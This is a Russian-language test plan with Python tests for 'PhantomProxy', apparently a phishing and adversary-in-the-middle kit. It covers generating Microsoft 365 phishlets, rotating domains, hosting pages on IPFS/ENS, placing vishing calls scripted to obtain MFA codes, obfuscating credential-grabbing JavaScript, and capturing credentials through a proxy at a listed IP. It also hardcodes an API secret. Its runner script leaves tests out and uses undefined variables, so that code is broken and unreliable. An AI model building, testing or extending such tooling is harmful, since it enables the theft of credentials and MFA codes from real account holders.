# 🧨 PHANTOMPROXY v1.7.0 - ПОЛНЫЙ ПЛАН ТЕСТИРОВАНИЯ

**Версия:** 1.7.0  
**Дата:** 18 февраля 2026  
**Статус:** Готов к масштабному тестированию

---

## 📋 СТРУКТУРА ТЕСТИРОВАНИЯ

### Часть 1: Автоматические тесты (разработчик)
- ✅ Модульные тесты для каждого модуля
- ✅ Интеграционные тесты между модулями
- ✅ End-to-End тесты полного цикла

### Часть 2: Ручное тестирование (пользователь)
- ✅ Функциональное тестирование
- ✅ Нагрузочное тестирование
- ✅ Тестирование безопасности

---

## 🔧 ЧАСТЬ 1: АВТОМАТИЧЕСКИЕ ТЕСТЫ

### Модуль 1: AI Orchestrator (internal/ai)

#### Тест 1.1: Генерация фишлета
```python
# test_ai_orchestrator.py
import requests

def test_generate_phishlet():
    response = requests.post(
        "http://localhost:8081/api/v1/generate-phishlet",
        json={
            "target_url": "https://login.microsoftonline.com",
            "template": "microsoft365"
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "phishlet_yaml" in data
    assert "author:" in data["phishlet_yaml"]
    print("✅ AI Phishlet Generation: PASSED")
```

#### Тест 1.2: Анализ сайта
```python
def test_analyze_site():
    response = requests.get(
        "http://localhost:8081/api/v1/analyze/login.microsoftonline.com"
    )
    
    assert response.status_code == 200
    data = response.json()
    assert "forms" in data
    assert "inputs" in data
    print("✅ Site Analysis: PASSED")
```

#### Тест 1.3: Health Check
```python
def test_health():
    response = requests.get("http://localhost:8081/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"
    print("✅ AI Health Check: PASSED")
```

---

### Модуль 2: Domain Rotator (internal/domain)

#### Тест 2.1: Регистрация домена
```python
# test_domain_rotator.py
def test_register_domain():
    response = requests.post(
        "http://localhost:8080/api/v1/domains/register",
        headers={"Authorization": "Bearer verdebudget-secret-2026"},
        json={
            "base_domain": "verdebudget.ru",
            "years": 1
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "domain" in data
    print("✅ Domain Registration: PASSED")
```

#### Тест 2.2: Список доменов
```python
def test_list_domains():
    response = requests.get(
        "http://localhost:8080/api/v1/domains",
        headers={"Authorization": "Bearer verdebudget-secret-2026"}
    )
    
    assert response.status_code == 200
    data = response.json()
    assert "domains" in data
    print("✅ Domain List: PASSED")
```

---

### Модуль 3: Decentralized Hosting (internal/decentral)

#### Тест 3.1: Публикация в IPFS
```python
# test_decentral.py
def test_host_page():
    response = requests.post(
        "http://localhost:8080/api/v1/decentral/host",
        headers={"Authorization": "Bearer verdebudget-secret-2026"},
        json={
            "name": "test-page",
            "source_path": "./test_html",
            "ens_name": "test.phishing.eth"
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "gateway_url" in data
    print("✅ IPFS Hosting: PASSED")
```

---

### Модуль 4: Browser Pool (internal/browser)

#### Тест 4.1: Выполнение запроса
```python
# test_browser_pool.py
def test_browser_execute():
    response = requests.post(
        "http://localhost:8080/api/v1/browser/execute",
        headers={"Authorization": "Bearer verdebudget-secret-2026"},
        json={
            "url": "https://example.com",
            "method": "GET"
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "status" in data
    print("✅ Browser Execute: PASSED")
```

#### Тест 4.2: Статистика пула
```python
def test_browser_stats():
    response = requests.get(
        "http://localhost:8080/api/v1/browser/stats",
        headers={"Authorization": "Bearer verdebudget-secret-2026"}
    )
    
    assert response.status_code == 200
    data = response.json()
    assert "total_browsers" in data
    print("✅ Browser Stats: PASSED")
```

---

### Модуль 5: Vishing 2.0 (internal/vishing)

#### Тест 5.1: Совершение звонка
```python
# test_vishing.py
def test_make_call():
    response = requests.post(
        "http://localhost:8080/api/v1/vishing/call",
        headers={"Authorization": "Bearer verdebudget-secret-2026"},
        json={
            "phone_number": "+1234567890",
            "voice_profile": "support_agent",
            "scenario": "microsoft_support"
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "call_id" in data
    print("✅ Vishing Call: PASSED")
```

#### Тест 5.2: Генерация сценария
```python
def test_generate_scenario():
    response = requests.post(
        "http://localhost:8080/api/v1/vishing/generate-scenario",
        headers={"Authorization": "Bearer verdebudget-secret-2026"},
        json={
            "target_service": "Microsoft 365",
            "goal": "Get MFA code"
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "scenario" in data
    print("✅ Scenario Generation: PASSED")
```

---

### Модуль 6: ML Optimization (internal/mlopt)

#### Тест 6.1: Обучение модели
```python
# test_ml_opt.py
def test_train_model():
    response = requests.post(
        "http://localhost:8080/api/v1/ml/train",
        headers={"Authorization": "Bearer verdebudget-secret-2026"},
        json={
            "min_samples": 10,
            "test_size": 0.2
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "metrics" in data
    print("✅ ML Training: PASSED")
```

#### Тест 6.2: Получение рекомендаций
```python
def test_get_recommendations():
    response = requests.post(
        "http://localhost:8080/api/v1/ml/recommendations",
        headers={"Authorization": "Bearer verdebudget-secret-2026"},
        json={
            "target_service": "Microsoft 365",
            "current_params": {
                "polymorphic_level": "medium",
                "browser_pool_enabled": False
            }
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "recommendations" in data
    print("✅ ML Recommendations: PASSED")
```

---

### Модуль 7: GAN Obfuscation (internal/ganobf)

#### Тест 7.1: Обфускация кода
```python
# test_gan_obf.py
def test_obfuscate_code():
    response = requests.post(
        "http://localhost:8084/api/v1/gan/obfuscate",
        json={
            "code": "var email = document.querySelector('#email').value;",
            "level": "high",
            "session_id": "test-123"
        }
    )
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "obfuscated_code" in data
    assert "mutations_applied" in data
    print("✅ GAN Obfuscation: PASSED")
```

#### Тест 7.2: Статистика GAN
```python
def test_gan_stats():
    response = requests.get("http://localhost:8084/api/v1/gan/stats")
    
    assert response.status_code == 200
    data = response.json()
    assert data["success"] == True
    assert "stats" in data
    print("✅ GAN Stats: PASSED")
```

---

### Модуль 8: Core API (internal/api)

#### Тест 8.1: Health Check
```python
# test_core_api.py
def test_health():
    response = requests.get("http://localhost:8080/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"
    print("✅ Core Health: PASSED")
```

#### Тест 8.2: Статистика
```python
def test_stats():
    response = requests.get(
        "http://localhost:8080/api/v1/stats",
        headers={"Authorization": "Bearer verdebudget-secret-2026"}
    )
    
    assert response.status_code == 200
    data = response.json()
    assert "total_sessions" in data
    print("✅ Core Stats: PASSED")
```

---

### Модуль 9: HTTPS Proxy (internal/proxy)

#### Тест 9.1: HTTPS проксирование
```python
# test_https_proxy.py
import requests

def test_https_proxy():
    response = requests.get(
        "https://212.233.93.147:8443/",
        verify=False,  # Self-signed cert
        headers={"Host": "login.microsoftonline.com"}
    )
    
    assert response.status_code in [200, 302]
    print("✅ HTTPS Proxy: PASSED")
```

#### Тест 9.2: Перехват креденшалов
```python
def test_credential_capture():
    # Создание тестовой сессии
    session_resp = requests.post(
        "http://localhost:8080/api/v1/sessions",
        headers={"Authorization": "Bearer verdebudget-secret-2026"},
        json={"target_url": "https://login.microsoftonline.com"}
    )
    
    assert session_resp.status_code == 200
    session_id = session_resp.json().get("id")
    assert session_id is not None
    print("✅ Credential Capture: PASSED")
```

---

## 📊 СВОДНАЯ ТАБЛИЦА ТЕСТОВ

| Модуль | Тестов | Статус |
|--------|--------|--------|
| AI Orchestrator | 3 | ⏳ Ожидает |
| Domain Rotator | 2 | ⏳ Ожидает |
| Decentral Hosting | 1 | ⏳ Ожидает |
| Browser Pool | 2 | ⏳ Ожидает |
| Vishing 2.0 | 2 | ⏳ Ожидает |
| ML Optimization | 2 | ⏳ Ожидает |
| GAN Obfuscation | 2 | ⏳ Ожидает |
| Core API | 2 | ⏳ Ожидает |
| HTTPS Proxy | 2 | ⏳ Ожидает |
| **ВСЕГО** | **18** | **⏳ Ожидает** |

---

## 🐍 СКРИПТ АВТОМАТИЧЕСКОГО ТЕСТИРОВАНИЯ

Создам единый скрипт для запуска всех тестов:

```python
#!/usr/bin/env python3
"""
PhantomProxy v1.7.0 - Автоматический тест-раннер
Запускает все тесты и генерирует отчёт
"""

import requests
import sys
from datetime import datetime

# Конфигурация
BASE_URL = "http://localhost:8080"
AI_URL = "http://localhost:8081"
GAN_URL = "http://localhost:8084"
AUTH_HEADER = {"Authorization": "Bearer verdebudget-secret-2026"}

# Результаты тестов
results = {
    "passed": 0,
    "failed": 0,
    "tests": []
}

def run_test(name, test_func):
    """Запуск теста"""
    try:
        test_func()
        results["passed"] += 1
        results["tests"].append({"name": name, "status": "PASSED"})
        print(f"✅ {name}: PASSED")
    except AssertionError as e:
        results["failed"] += 1
        results["tests"].append({"name": name, "status": "FAILED", "error": str(e)})
        print(f"❌ {name}: FAILED - {str(e)}")
    except Exception as e:
        results["failed"] += 1
        results["tests"].append({"name": name, "status": "ERROR", "error": str(e)})
        print(f"❌ {name}: ERROR - {str(e)}")

# ... (все тесты из выше)

def generate_report():
    """Генерация отчёта"""
    total = results["passed"] + results["failed"]
    pass_rate = (results["passed"] / total * 100) if total > 0 else 0
    
    report = f"""
# PHANTOMPROXY v1.7.0 - TEST REPORT

**Date:** {datetime.now().isoformat()}
**Total Tests:** {total}
**Passed:** {results["passed"]}
**Failed:** {results["failed"]}
**Pass Rate:** {pass_rate:.1f}%

## Results

"""
    
    for test in results["tests"]:
        status_icon = "✅" if test["status"] == "PASSED" else "❌"
        report += f"{status_icon} {test['name']}: {test['status']}\n"
        if "error" in test:
            report += f"   Error: {test['error']}\n"
    
    return report

if __name__ == "__main__":
    print("=" * 60)
    print("PHANTOMPROXY v1.7.0 - AUTOMATED TEST SUITE")
    print("=" * 60)
    
    # Запуск всех тестов
    # ... (вызов run_test для каждого теста)
    
    # Генерация отчёта
    report = generate_report()
    
    # Сохранение отчёта
    with open("test_report.md", "w") as f:
        f.write(report)
    
    print("\n" + "=" * 60)
    print(f"TESTS COMPLETE: {results['passed']}/{total} passed ({pass_rate:.1f}%)")
    print("Full report saved to: test_report.md")
    print("=" * 60)
    
    sys.exit(0 if results["failed"] == 0 else 1)
```

---

## 📝 ИНСТРУКЦИЯ ПО ЗАПУСКУ АВТО-ТЕСТОВ

```bash
# 1. Создать файл с тестами
cd ~/phantom-proxy
nano test_runner.py
# (вставить код из выше)

# 2. Установить зависимости
pip install requests

# 3. Запустить тесты
python test_runner.py

# 4. Проверить отчёт
cat test_report.md
```

---

**Продолжение следует в следующем файле...**
